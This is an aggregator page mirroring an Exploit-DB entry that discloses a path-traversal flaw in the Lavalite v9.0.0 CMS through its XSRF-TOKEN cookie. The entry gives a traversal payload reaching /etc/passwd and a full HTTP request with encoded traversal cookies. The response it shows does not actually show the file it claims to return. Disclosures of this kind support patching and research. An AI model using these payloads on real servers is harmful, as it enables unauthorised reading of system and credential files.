---
title: [webapps] Lavalite v9.0.0 - XSRF-TOKEN cookie File path traversal
url: https://buaq.net/go-155219.html
source: unSafe.sh - 不安全
date: 2023-03-26
fetch_date: 2025-10-04T10:42:28.431526
---

# [webapps] Lavalite v9.0.0 - XSRF-TOKEN cookie File path traversal

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![]()

[webapps] Lavalite v9.0.0 - XSRF-TOKEN cookie File path traversal

## Exploit Title: Lavalite v9.0.0 - XSRF-TOKEN co
*2023-3-25 08:0:0
Author: [www.exploit-db.com(查看原文)](/jump-155219.htm)
阅读量:16
收藏*

---

```
## Exploit Title: Lavalite v9.0.0 - XSRF-TOKEN cookie File path traversal
## Exploit Author: nu11secur1ty
## Date: 09.29.2022
## Vendor: https://lavalite.org/
## Software: https://github.com/LavaLite/cms/releases/tag/v9.0.0
## Reference: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/LavaLite

## Description:
The XSRF-TOKEN cookie is vulnerable to path traversal attacks,
enabling read access to arbitrary files on the server.
The payload ../../../../../../../../../../../../../../../../etc/passwd[0x00]eyJpdiI6InhwNlhibUc0K3hrL3RQdHZNYlp5Qnc9PSIsInZhbHVlIjoiU2daQ2YzeFNWSjN4OHZNdEZSMlhiOVpkbGUweDdKSDdXbXc1eitGc3RSTXNFTFBqUGR1ekJOSitUTjcyWVRYTkVzV2lpMDkxb3FHM2k5S1Y2VlZZRGVVN2h2WkpJeGcxZVluVDhrdDkvUDgxN2hTNjY5elRtQllheDlPOEM5aGgiLCJtYWMiOiI4ZDBkMjI0NmFkNDQ2YTA5ZjhkNDI0ZjdhODk0NWUzMjY2OTIxMjRmMzZlZjI4YWMwNmRiYTU5YzRiODE5MDk5IiwidGFnIjoiIn0=
was submitted in the XSRF-TOKEN cookie.
The requested file was returned in the application's response. The
malicious user can get very sensitive information from this CMS
system.

STATUS: HIGH Vulnerability

[+]Payload:

```POST
GET /cms-master/website/public/about.html HTTP/1.1
Host: pwnedhost.com
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102
Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: XSRF-TOKEN=eyJpdiI6IjNZbEZudjg0RXpFNEVLWHBUK0p6R1E9PSIsInZhbHVlIjoiNjFVbmZUVUJQWVdYWXJVOUVJRWVVdHN0UWtOQjJXZGRiS2N4T2lkM0VDeXFxcDRZdG1tRFVaQUk3dlhsWHRvOVQxVnQvbFhWRUJTbUllczh6MmhFUE84N1puNVFMSVFFeWdmRlJUYkdFRGdCakZ4eEJXeHllRTdFOFNPK0pLcnkiLCJtYWMiOiJhMDBlZWFiNDFlNzE2Yzc1ZjA2NzEzYzY2Y2U0ZDQ3NzdkMTI4OTY1NjA4OTNmNDE4ZDNmNWRkYzFkN2IzMWEwIiwidGFnIjoiIn0%3D;
lavalite_session=eyJpdiI6ImxiWmVuV0xlU3ZtVWhLVW1Oc2duSEE9PSIsInZhbHVlIjoiUG5WMjhMNVppUkhST1Bta1FOd1VJUDR5ZW1lRU56bXpDTnpaVzkrUHFzQzJpKzE4YlFuNEQ2RnNlKzM2Tkg0Y2VZMExCRTBUUnRQajlpTmJCUXJjT3ZETzV6OVZveURuaTFHOHdoN3pneUR3NGhQc09OUjdKb0VreFV1Y0tuOTgiLCJtYWMiOiJlMTdlMTAyZTQ3MmMyMjZlMWE5MTkwMzc0NTU2OTFkOTlmOTM4MGVlZDE4NWU4MGNkZGM4OTllMTRmYTE3MGM1IiwidGFnIjoiJTJlJTJlJTJmJTJlJTJlJTJmJTJlJTJlJTJmJTJlJTJlJTJmJTJlJTJlJTJmJTJlJTJlJTJmJTJlJTJlJTJmJTJlJTJlJTJmJTJlJTJlJTJmJTJlJTJlJTJmZXRjJTJmcGFzc3dkIn0%3d
Upgrade-Insecure-Requests: 1
Referer: http://pwnedhost.com/cms-master/website/public/
Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="105", "Chromium";v="105"
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0
Content-Length: 0
```

[+]Response:

```Request
<script src="http://pwnedhost.com/cms-master/website/public/themes/public/assets/dist/js/manifest.js"></script>
<script src="http://pwnedhost.com/cms-master/website/public/themes/public/assets/dist/js/vendor.js"></script>
<script src="http://pwnedhost.com/cms-master/website/public/themes/public/assets/dist/js/app.js"></script>
<script src="http://pwnedhost.com/cms-master/website/public/themes/public/assets/js/main.js"></script>
<script src="http://pwnedhost.com/cms-master/website/public/themes/public/assets/js/theme.js"></script>
```

## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/LavaLite)

## Proof and Exploit:
[href](https://streamable.com/nis1hg)

--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/
https://cve.mitre.org/index.html and https://www.exploit-db.com/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
                          nu11secur1ty <http://nu11secur1ty.com/>
```

文章来源: https://www.exploit-db.com/exploits/51050
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)